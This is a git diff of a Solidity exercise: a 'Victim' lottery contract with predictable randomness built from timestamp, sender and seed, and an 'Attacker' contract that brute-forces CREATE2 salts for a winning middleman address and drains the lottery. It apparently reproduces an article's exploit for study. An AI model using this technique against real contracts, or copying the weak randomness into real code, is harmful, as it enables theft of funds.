@@ -11,7 +11,9 @@ contract Victim {
         seed = _seed;
     }
 
+
     function lottery() public payable {
+        console.log((address(this)).balance);
         uint256 random = (block.timestamp + uint160(msg.sender) + seed) % 10;
 
         console.log(random, block.timestamp, uint160(msg.sender), seed);
@@ -36,7 +38,7 @@ contract Attacker {
     event AttackStarted(address middlemanAddress, uint nonce);
     receive() external payable{}
 
-    function attack1(uint256 _seed, address _victim) public payable {
+    function attack1(uint256 _seed, address _victim) public payable {            // article method
         uint nonce;
         while (true) {
             address middlemanAddress = address(new Middleman());
@@ -52,7 +54,7 @@ contract Attacker {
         }
     }
 
-    function attack2(uint256 _seed, address _victim) public payable {
+    function attack2(uint256 _seed, address _victim) public payable {            // my method
         bytes memory bytecode = type(Middleman).creationCode;
         uint nonce;
         while (true) {
@@ -60,10 +62,19 @@ contract Attacker {
             address middlemanAddress = address(uint160(uint(hash)));
             uint256 random = (block.timestamp + uint160(middlemanAddress) + _seed) % 10;
             if (random == 5) {
+                Middleman middleman;
+                uint size;
+                assembly { size := extcodesize(middlemanAddress) }
                 console.log("nonce", nonce);
-                Middleman middleman = new Middleman{
-                    salt: bytes32(nonce)
-                }();
+                if(size == 0){
+                    middleman = new Middleman{
+                        salt: bytes32(nonce)
+                    }();
+                    // require(middlemanAddress == deployedProxy, "ERROR Different Address");
+                }else{
+                   middleman =  Middleman(payable(middlemanAddress));
+                }
+                
                 middleman.attack{value: 1 ether}(_victim);
                 payable(msg.sender).transfer(address(this).balance);
                 emit AttackStarted(middlemanAddress, nonce);
